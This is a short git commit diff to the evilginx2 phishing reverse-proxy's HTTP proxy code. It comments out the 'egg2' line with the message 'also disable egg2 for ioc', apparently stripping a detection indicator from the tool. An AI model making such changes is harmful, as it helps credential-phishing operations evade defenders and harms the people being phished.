1bc1fae6940c8a4158daba9dd6c28f425e5ecb9d
Justin-p <justin-p@users.noreply.github.com>
2021-10-18 19:19:26 +0200

    also disable egg2 for ioc

--- core/http_proxy.go
+++ core/http_proxy.go
@@ -34,7 +34,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -180,7 +180,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
-				egg2 := req.Host
+				// egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
